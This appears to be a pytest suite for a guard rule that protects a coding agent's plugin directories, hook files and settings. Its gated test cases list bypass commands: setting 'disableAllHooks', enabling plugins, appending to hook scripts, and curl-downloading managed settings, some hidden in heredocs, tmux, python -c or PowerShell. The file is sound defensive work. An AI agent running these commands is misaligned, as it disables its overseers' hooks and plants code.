    ("tar --get -f /tmp/e.tar -C ~/.claude", None),
    ("tar --get --file=/tmp/e.tar -C ~/.claude", None),
    ("tar --get -z -f /tmp/e.tar -C $CLAUDE_CONFIG_DIR", None),
    ("cat /tmp/e.tar | tar --get -C ~/.claude", None),
    ("bsdtar --get -f /tmp/e.tar -C ~/.claude", None),
    ("cd plugins/cache/m/p/1.0 && sed -i s/a/b/ hooks/hooks.json", "/root/.claude"),
    ("cd plugins && perl -pi -e s/a/b/ cache/m/p/1.0/hooks/hooks.json", "/root/.claude"),
    ("cd ~/.claude; cd plugins; sed -i s/a/b/ cache/m/p/1.0/hooks/hooks.json", None),
    ("cd $CLAUDE_CONFIG_DIR && cd plugins && sed -i s/a/b/ cache/m/p/hooks/hooks.json", None),
    ("find ~ -path '*plugins/cache*' -name '*.sh' -exec sh -c 'echo evil >> \"$1\"' _ {} \;", None),
    ("export CLAUDE_CONFIG_DIR=/tmp/evil; claude -p hi", None),
    ("env -S 'CLAUDE_CONFIG_DIR=/tmp/e claude -p hi'", None),
])
def test_b3_gated(cmd, cwd):
    assert evaluate(_sh(cmd, cwd), EMPTY).action != Action.ALLOW, cmd


@pytest.mark.parametrize("cmd,cwd", [
    ("tar --list -f a.tar -C ~/.claude", None),
    ("cd src && cd plugins && sed -i s/a/b/ index.js", None),
    ("cd ~/myrepo && cd plugins && npm test", None),
    ("find . -name '*.sh' -exec chmod +x {} +", None),
    ("cd plugins && ls", "/root/.claude"),
    ("cd ~/.claude/plugins && cat known_marketplaces.json", None),
    ("cd /tmp && echo x > y", "/root/.claude/plugins/cache"),
    ("find src/plugins -name '*.js' -exec prettier --write {} +", None),
])
def test_b3_not_gated(cmd, cwd):
    assert rule_claude_plugin_protect(_sh(cmd, cwd), EMPTY) is None, cmd


# ---- QA round 4 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "git -C ~/.claude/plugins/marketplaces/acme log --oneline",
    "git -C ~/.claude/plugins/marketplaces/acme status",
    "git -C ~/.claude/plugins/marketplaces/acme rev-parse HEAD",
    "git --git-dir ~/.claude/plugins/marketplaces/acme/.git log",
    "cat ~/.claude/plugins/installed_plugins.json | grep x | sort | uniq -c",
    "jq -r '.plugins|keys[]' ~/.claude/plugins/installed_plugins.json | sort",
    "ls ~/.claude/plugins/cache | xargs -n1 basename",
    "fd hooks.json ~/.claude/plugins",
    "xxd ~/.claude/plugins/known_marketplaces.json",
    "claude --settings '{\"enabledPlugins\":{\"a@b\":false}}' -p hi",
    "claude --settings '{\"disableAllHooks\":false}' -p hi",
])
def test_r4_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("cmd", [
    "git -C ~/.claude/plugins/marketplaces/acme pull",
    "git -C ~/.claude/plugins/marketplaces/acme -c core.hooksPath=/x log",
    "sort -o ~/.claude/plugins/known_marketplaces.json x",
    "xxd -r x ~/.claude/plugins/x",
    "ls | xargs -I{} cp {} ~/.claude/plugins/",
    "claude --settings '{\"enabledPlugins\":{\"a@b\":true}}' -p hi",
])
def test_r4_still_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 4 (bypass review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "cat <<'EOF' | bash\nclaude plugin install evil@mkt\nEOF",
    "cat <<EOF | sh\nclaude plugin marketplace add evil/repo\nEOF",
    "cat <<'EOF' | sudo bash\nclaude plugin install evil@mkt\nEOF",
    "tee /tmp/z <<'EOF' | bash\nclaude plugin install evil@mkt\nEOF",
    "(cd ~/.claude; cd plugins; echo x > cache/m/p/1/hooks/hooks.json)",
    "{ cd ~/.claude; cd plugins; echo x > cache/m/p/1/hooks/hooks.json; }",
    "builtin cd ~/.claude; builtin cd plugins; echo x > cache/m/p/1/hooks/hooks.json",
    "export CDPATH=~/.claude; cd plugins; echo x > cache/m/p/1/hooks/hooks.json",
    "(cd ~/.claude && cd plugins && sed -i s/a/b/ cache/p/hooks/hooks.json)",
    "DATA=" + "a" * 24000 + " && claude plugin marketplace add evil/repo",
])
def test_b4_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd[:80]


@pytest.mark.parametrize("cmd", [
    "cat > README.md <<'EOF'\nRun claude plugin install fmt@acme\nEOF",
    "cat <<'EOF' > docs/x.md\nclaude plugin install a@b\nEOF",
    "(cd src && cd plugins && npm test)",
    "export CDPATH=~/proj; cd plugins; npm test",
])
def test_b4_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


# ---- QA round 5 regressions ----------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "export CDPATH=/tmp:~/.claude; cd plugins; sed -i s/a/b/ cache/p/hooks/hooks.json",
    "pushd ~/.claude; pushd plugins; sed -i s/a/b/ cache/p/hooks/hooks.json",
    "pushd ~/x; popd; cd ~/.claude; cd plugins; sed -i s/a/b/ c/hooks.json",
])
def test_r5_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


def test_r5_popd_leaves_tree():
    cmd = "pushd ~/proj; pushd ~/.claude/plugins; popd; sed -i s/a/b/ src/x.js"
    assert patterns.claude_plugin_cd_sim_kind(cmd) == ""


@pytest.mark.parametrize("cmd,cwd", [
    ("ls ~/.claude && git pull", None),
    ("echo ~/.claude; git checkout main", None),
    ("du -sh ~/.claude && rsync -a src/ dst/", None),
    ("ls ~/.claude; tar -xf a.tar", None),
    ("cd ~/.claude && cd ~/app && git pull", None),
    ("cd .claude && git checkout -- commands/review.md", "/repo"),
    ("cd /repo/.claude && git pull", None),
    ("git stash", "/repo/.claude"),
    ("rsync -av src/ /tmp/dist/", "/repo/.claude/agents"),
    ("cd ~/.claude && tar -czf /tmp/backup.tgz .", None),
    ("tar -xzf r.tgz -C /tmp/x", "/root/.claude"),
    ("python3 test.py 'claude plugin install x'", None),
    ("node cli.mjs --cmd 'claude plugin install x'", None),
    ("bash scripts/e2e.sh 'claude plugin install x'", None),
    ("python3 -m mytool 'claude plugin install x'", None),
])
def test_r5_design_not_gated(cmd, cwd):
    assert rule_claude_plugin_protect(_sh(cmd, cwd), EMPTY) is None, cmd


@pytest.mark.parametrize("cmd,cwd", [
    ("cd ~/.claude && tar -xf /tmp/e.tar", None),
    ("cd ~/.claude && git pull", None),
    ("tar -xf /tmp/e.tar", "/root/.claude"),
    ("unzip /tmp/e.zip", "/root/.claude"),
    ("python3 -c \"import os; os.system('claude plugin install x@m')\"", None),
    ("bash -c 'claude plugin install x@m'", None),
])
def test_r5_design_still_gated(cmd, cwd):
    assert evaluate(_sh(cmd, cwd), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 6 (bypass review) regressions ---------------------------------
@pytest.mark.parametrize("cmd,cwd", [
    ("cp managed-settings.json /etc/claude-code/", None),
    ("sudo cp managed-settings.json /etc/claude-code/", None),
    ("cp managed-settings.json /etc/claude-code", None),
    ("cp -t /etc/claude-code managed-settings.json", None),
    ("install -m644 managed-settings.json /etc/claude-code/", None),
    ("mv managed-settings.json /etc/claude-code/", None),
    ("rsync managed-settings.json /etc/claude-code/", None),
    ("ln -s $PWD/managed-settings.json /etc/claude-code/", None),
    ("cp -r deploy/etc/claude-code /etc/", None),
    ("sudo cp managed-settings.json '/Library/Application Support/ClaudeCode/'", None),
    ("Copy-Item .\\managed-settings.json C:\\ProgramData\\ClaudeCode\\", None),
    ("sudo tee /etc/claude-code/managed-settings.json < managed-settings.json > /dev/null", None),
    ("cat managed-settings.json | sudo tee /etc/claude-code/managed-settings.json > /dev/null", None),
    ("cat /tmp/x | sudo tee /etc/claude-code/managed-settings.d/50-x.json", None),
    ("cat /tmp/x | tee \"$CLAUDE_CONFIG_DIR/settings.json\"", None),
    ("tee settings.local.json < /tmp/x", "/r/.claude"),
    ("cat /tmp/x | tee settings.local.json", "/r/.claude"),
    ("cd .claude; cat /tmp/x | tee settings.local.json", None),
    ("cp settings.json \"$CLAUDE_CONFIG_DIR/\"", None),
    ("cp ./ci/settings.json $CLAUDE_CONFIG_DIR", None),
    ("cp -r plugins \"$CLAUDE_CONFIG_DIR/\"", None),
    ("tmux new -d 'claude plugin install x@y'", None),
    ("tmux send-keys -t x 'claude plugin install x@y' Enter", None),
    ("expect -c 'spawn claude plugin install x@y; interact'", None),
    ("sponge .claude/settings.local.json < /tmp/x", None),
    ("jq --slurpfile p /tmp/x '. + $p[0]' .claude/settings.local.json | sponge .claude/settings.local.json", None),
    ("find ~ -name hooks.json -path '*cache*' | xargs -I{} cp /tmp/h {}", None),
])
def test_b6_gated(cmd, cwd):
    assert evaluate(_sh(cmd, cwd), EMPTY).action != Action.ALLOW, cmd


def test_b6_mcp_json_setter():
    import tempfile, os
    d = tempfile.mkdtemp()
    os.makedirs(os.path.join(d, ".claude"))
    f = os.path.join(d, ".claude", "settings.local.json")
    open(f, "w").write("{}")
    ev = _mcp({"file": f, "path": "enabledPlugins.evil@m", "value": True}, tool="mcp__json__set_value")
    assert evaluate(ev, EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("cmd", [
    "cp README.md /tmp/",
    "cp -r dist /etc/nginx/",
    "tee out.log < input.txt",
    "find . -name '*.json' | xargs grep plugins",
    "tmux new -d 'npm run dev'",
])
def test_b6_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("s", ['"$a"' * 95000, "echo " + "\\u0041" * 65000, "echo " + "\\x41" * 97500])
def test_b6_perf(s):
    import time
    t = time.time()
    rule_claude_plugin_protect(_sh(s), EMPTY)
    assert time.time() - t < 2.0


def test_b6_cat_jq_sponge_edit_not_gated():
    cmd = "cat .claude/settings.local.json | jq '.model=\"x\"' | sponge .claude/settings.local.json"
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None


# ---- QA round 7 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "jq . < .claude/settings.local.json",
    "jq -r '.permissions.allow[]' < .claude/settings.local.json | sort",
    "python3 -m json.tool < .claude/settings.local.json",
    "cd ~/.claude && unzip -o ~/agents.zip -d agents",
    "cat > out.py <<'EOF'\n" + "x = 1\n" * 9000 + "EOF",
])
def test_r7_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd, "/proj"), EMPTY) is None, cmd[:60]


@pytest.mark.parametrize("cmd", [
    "cd ~/.claude && unzip -o /tmp/e.zip -d plugins/cache",
    "cd ~/.claude && unzip -o /tmp/e.zip -d .",
    "tee .claude/settings.local.json < /tmp/x",
])
def test_r7_still_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 7 (bypass review) regressions ---------------------------------
_PYJ = ("python3 - <<'EOF'\nimport json, os\nfrom pathlib import Path\n{p}\n"
        "d = json.loads(p.read_text())\nd['disableAllHooks'] = True\np.write_text(json.dumps(d))\nEOF")


@pytest.mark.parametrize("cmd", [
    _PYJ.format(p="p = Path('.claude') / 'settings.local.json'"),
    _PYJ.format(p="p = Path(os.path.join('.claude','settings.local.json'))"),
    "cat <<'EOF' | python3\nfrom pathlib import Path\np=Path('.claude')/'settings.local.json'\nimport json\nd=json.loads(p.read_text());d.setdefault('enabledPlugins',{})['x@y']=True\np.write_text(json.dumps(d))\nEOF",
    "node <<'EOF'\nconst fs=require('fs'),path=require('path');const p=path.join('.claude','settings.local.json');const s=JSON.parse(fs.readFileSync(p));s.disableAllHooks=true;fs.writeFileSync(p,JSON.stringify(s));\nEOF",
    "python3 - <<'EOF'\nfrom pathlib import Path\n(Path.home() / '.claude' / 'plugins' / 'cache' / 'p' / 'hooks.json').write_text('{}')\nEOF",
    "python3 -c \"import os;open(os.path.join(os.environ['CLAUDE_CONFIG_DIR'],'settings.json'),'w').write('{\\\"disableAllHooks\\\":true}')\"",
    "python3 - <<'EOF'\nfrom pathlib import Path\n(Path('/etc/claude-code') / 'managed-settings.json').write_text('{\"enabledPlugins\":{\"a@b\":true}}')\nEOF",
    "git checkout evil -- .claude/settings.local.json",
    "git restore --source=evil .claude/settings.local.json",
    "python3 -c \"import subprocess; subprocess.run(['claude','--plugin-dir','./p','-p','hi'])\"",
    "python3 - <<'EOF'\nimport os\nos.system('claude -p \"review\" --plugin-dir ./tools/plugin')\nEOF",
    "python3 -c \"import subprocess,os; subprocess.run(['claude','-p','hi'], env={**os.environ,'CLAUDE_CONFIG_DIR':'/tmp/c'})\"",
])
def test_b7_gated(cmd):
    assert _ours(rule_claude_plugin_protect(_sh(cmd, "/proj"), EMPTY)), cmd[:80]


@pytest.mark.parametrize("cmd", [
    "python3 - <<'EOF'\nfrom pathlib import Path\nprint(Path('.claude') / 'settings.local.json')\nEOF",
    "python3 -c \"import subprocess; subprocess.run(['claude','-p','hi'])\"",
    "claude --settings '{\"model\":\"x\"}' -p hi",
    "python3 scripts/build.py --out dist",
])
def test_b7_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd, "/proj"), EMPTY) is None, cmd[:80]


# ---- QA round 8 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "gh pr create --title t --body \"Gate disableAllHooks in .claude/settings.local.json\"",
    "gh issue create --title \"enabledPlugins in .claude/settings.local.json not gated\"",
    "gh pr comment 5 --body 'see ~/.claude/plugins/cache for the hooks'",
    "tar -czf backup.tgz ~/.claude/plugins",
    "zip -r /tmp/p.zip ~/.claude/plugins",
    "rsync -a ~/.claude/plugins/ /tmp/pb/",
    "git restore --staged .claude/settings.local.json",
])
def test_r8_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("args,tool", [
    ({"body": "~/.claude/plugins/cache/x/hooks/hooks.json is wrong"}, "mcp__github__add_issue_comment"),
    ({"text": "~/.claude/plugins/ is where plugins live"}, "mcp__slack__post_message"),
])
def test_r8_mcp_prose_not_gated(args, tool):
    assert rule_claude_plugin_protect(_mcp(args, tool=tool), EMPTY) is None


@pytest.mark.parametrize("cmd", [
    "gh api repos/x/y/contents/f > ~/.claude/plugins/x.json",
    "tar -czf ~/.claude/plugins/evil.tgz x",
    "rsync -a /tmp/evil/ ~/.claude/plugins/",
    "git restore --staged --worktree --source=evil .claude/settings.local.json",
])
def test_r8_still_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 8 (bypass review) regressions ---------------------------------
_CD = "${CLAUDE_CONFIG_DIR:-$HOME/.claude}"


@pytest.mark.parametrize("cmd", [
    "echo '{\"disableAllHooks\": true}' > \"" + _CD + "/settings.json\"",
    "jq '.disableAllHooks = true' \"" + _CD + "/settings.json\" | sponge \"" + _CD + "/settings.json\"",
    "jq '.enabledPlugins[\"x@y\"]=true' \"" + _CD + "/settings.json\" > /tmp/s && mv /tmp/s \"" + _CD + "/settings.json\"",
    "echo '{\"disableAllHooks\": true}' > \"${CLAUDE_CONFIG_DIR:-~/.claude}/settings.json\"",
    "echo '{\"disableAllHooks\": true}' > \"${CLAUDE_CONFIG_DIR-$HOME/.claude}/settings.json\"",
    "echo '{\"disableAllHooks\": true}' > \"${CLAUDE_CONFIG_DIR:=$HOME/.claude}/settings.json\"",
    "echo '{\"disableAllHooks\": true}' > \"" + _CD + "\"/settings.json",
    "echo '{\"disableAllHooks\":1}' | tee \"" + _CD + "/settings.json\"",
    "cp ./team-settings.json \"" + _CD + "/settings.json\"",
    "cp -r ./plugins \"" + _CD + "/\"",
    "rsync -a ./dotclaude/ \"" + _CD + "/\"",
    "tar -xzf plugins.tgz -C \"" + _CD + "\"",
    "Set-Content (Join-Path $env:CLAUDE_CONFIG_DIR settings.json) '{\"disableAllHooks\":true}'",
    "Copy-Item -Recurse .\\p (Join-Path $env:CLAUDE_CONFIG_DIR plugins)",
    "Copy-Item -Recurse .\\p (Join-Path $env:CLAUDE_CONFIG_DIR 'plugins\\cache\\x')",
    "xxd -pr payload.hex ~/.claude/plugins/cache/m/p/hooks/run.sh",
    "sort -uo ~/.claude/plugins/x.sh payload.sh",
    "sort --out=~/.claude/plugins/x.sh payload.sh",
    "tree ~/.claude/plugins -o ~/.claude/plugins/x",
])
def test_b8_gated(cmd):
    assert evaluate(_sh(cmd, "/proj"), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 9 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "ls \"${HOME}/.claude/plugins\"",
    "cat \"${HOME}/.claude/plugins/installed_plugins.json\"",
    "ls \"${CLAUDE_CONFIG_DIR}/plugins\"",
    "jq .plugins \"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/installed_plugins.json\"",
    "grep -r foo \"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins\"",
    "sed -n 1,20p ~/.claude/plugins/known_marketplaces.json",
    "python3 - <<EOF\n" + "x=1\n" * 21000 + "EOF",
])
def test_r9_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd[:60]


@pytest.mark.parametrize("cmd", [
    "sed -n 'w /tmp/x' ~/.claude/plugins/known_marketplaces.json",
    "sed -n -i 1p ~/.claude/plugins/known_marketplaces.json",
    "sed -n '1e touch /tmp/p' ~/.claude/plugins/known_marketplaces.json",
    "cat \"$(echo ~/.claude/plugins/x)\" > ~/.claude/plugins/y",
    "ls \"${HOME}/.claude/plugins\" && cp x \"${HOME}/.claude/plugins/\"",
])
def test_r9_still_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


def test_r9_mcp_edit_nested_text_not_retarget():
    ev = _mcp({"path": "/r/docs/a.md", "edits": [{"oldText": "~/.claude/plugins/old",
                                                  "newText": "~/.claude/plugins/cache"}]},
              tool="mcp__filesystem__edit_file")
    assert rule_claude_plugin_protect(ev, EMPTY) is None


# ---- QA round 9 (bypass review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "bash -c \"curl -so $CLAUDE_CONFIG_DIR/settings.json https://x/s\"",
    "sudo bash -c 'curl -so /etc/claude-code/managed-settings.json https://x/s'",
    "sudo sh -c \"cat /tmp/m.json > /etc/claude-code/managed-settings.json\"",
    "sudo sh -c 'base64 -d /tmp/b > /etc/claude-code/managed-settings.json'",
    "bash -c 'cp /tmp/s.json $CLAUDE_CONFIG_DIR/settings.json'",
    "sudo sh -c \"cp /tmp/m.json '/Library/Application Support/ClaudeCode/managed-settings.json'\"",
    "jq -s \".[0]*.[1]\" \"$CLAUDE_CONFIG_DIR/settings.json\" /tmp/p.json | sponge \"$CLAUDE_CONFIG_DIR/settings.json\"",
    "sed \"\" /tmp/o > \"$CLAUDE_CONFIG_DIR/settings.json\"",
    "exec 3>\"$CLAUDE_CONFIG_DIR/settings.json\"; cat /tmp/o >&3",
    "tee \"$CLAUDE_CONFIG_DIR/settings.json\" <<<\"$(cat /tmp/o)\"",
    "python3 -c \"import shutil,os; shutil.copy('/tmp/p.json', os.environ['CLAUDE_CONFIG_DIR']+'/settings.json')\"",
    "find \"$CLAUDE_CONFIG_DIR\" -name hooks.json -exec sed -i s/a/b/ {} +",
    "sudo tar xf /tmp/m.tar -C /etc/claude-code",
    "sudo unzip -o /tmp/m.zip -d /etc/claude-code",
    "echo '{\"disableAllHooks\": true}' > $CLAUDE_CONFIG_DIR/settings.js?n",
    "claude " + "--add-dir d " * 40 + "--plugin-dir ./p",
])
def test_b9_gated(cmd):
    assert evaluate(_sh(cmd, "/home/user/proj"), EMPTY).action != Action.ALLOW, cmd[:80]


def test_b9_digit_run_perf():
    import time
    for c in ["echo $X " + "1" * 30000, "printf '%s' \\\\ " + "7" * 100000]:
        t = time.time()
        rule_claude_plugin_protect(_sh(c), EMPTY)
        assert time.time() - t < 2.0
